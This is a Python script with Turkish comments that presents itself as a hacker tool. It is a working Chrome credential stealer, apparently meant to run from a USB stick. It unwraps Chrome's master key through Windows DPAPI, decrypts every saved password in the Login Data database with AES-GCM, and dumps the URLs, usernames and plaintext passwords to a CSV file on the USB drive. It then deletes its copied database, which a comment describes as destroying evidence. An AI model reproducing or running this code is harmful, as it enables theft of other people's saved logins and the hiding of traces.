import os
import json
import base64
import sqlite3
import shutil
import csv
import win32crypt # pypiwin32 kütüphanesi
from Crypto.Cipher import AES # pycryptodome kütüphanesi

# --- HACKER NOTE: CHROME AES DECRYPTION TOOL ---
# Bu araç, Windows DPAPI ve AES-GCM algoritmasını kullanarak
# tarayıcıdaki "Login Data" veritabanını decrypt eder.

def get_master_key():
    # 1. ADIM: Chrome'un "Local State" dosyasından şifreli anahtarı al
    local_state_path = os.path.join(os.environ['USERPROFILE'],
                                    r'AppData\Local\Google\Chrome\User Data\Local State')
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # 2. ADIM: Anahtarı Base64'ten çöz ve 'DPAPI' ön ekini at
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # İlk 5 harf 'DPAPI' yazısıdır, atıyoruz.

    # 3. ADIM: Windows API kullanarak anahtarı decrypt et
    # Bu işlem sadece o bilgisayarda oturum açmış kullanıcı adına yapılabilir.
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key

def decrypt_password(buff, master_key):
    try:
        # Şifreli veri 'v10' veya 'v11' ile başlar (AES-GCM İmzası)
        iv = buff[3:15]
        payload = buff[15:]
        # AES Şifre Çözücü Oluştur
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        # Şifreyi kır ve temiz metni al
        decrypted_pass = cipher.decrypt(payload)
        return decrypted_pass[:-16].decode() # Son 16 byte tag'dir, atıyoruz.
    except:
        return "Sifre Cozulemedi (Eski Versiyon Olabilir)"

def run_attack():
    # USB Konumunu Bul
    usb_path = os.path.dirname(os.path.abspath(__file__))
    output_csv = os.path.join(usb_path, "HACKLENEN_MAILLER.csv")
    
    # Hedef Veritabanı Yolu
    db_path = os.path.join(os.environ['USERPROFILE'], 
                           r'AppData\Local\Google\Chrome\User Data\Default\Login Data')
    
    if not os.path.exists(db_path):
        print("[!] Chrome veritabanı bulunamadı.")
        return

    # Veritabanı kilitli olduğu için kopyasını alıyoruz (Shadow Copy mantığı)
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    
    # Master Key'i (Maymuncuk) al
    try:
        master_key = get_master_key()
    except Exception as e:
        print(f"[!] Anahtar alinamadi: {e}")
        return

    # Veritabanına bağlan
    conn = sqlite3.connect(filename)
    cursor = conn.cursor()
    
    print("-" * 50)
    print("SALDIRI BASLATILIYOR... (AES-256 DECRYPTION)")
    print("-" * 50)

    # Verileri çek
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        
        with open(output_csv, mode='w', newline='', encoding='utf-8') as file:
            writer = csv.writer(file)
            writer.writerow(["URL (Site)", "KULLANICI (Mail)", "SIFRE (Kirilmis)"])
            
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                
                # Sadece mail ve şifre varsa işlem yap
                if username and encrypted_password:
                    decrypted_password = decrypt_password(encrypted_password, master_key)
                    
                    if len(decrypted_password) > 0:
                        print(f"[+] HACKLENDI: {username} | {decrypted_password[:3]}***")
                        writer.writerow([url, username, decrypted_password])
                        
    except Exception as e:
        print(f"[!] HATA: {e}")

    cursor.close()
    conn.close()
    try:
        os.remove(filename) # Delilleri yok et (Kopya DB sil)
    except: pass
    
    print(f"\n[SUCCESS] Tum veriler '{output_csv}' dosyasina döküldü.")

if __name__ == "__main__":
    run_attack()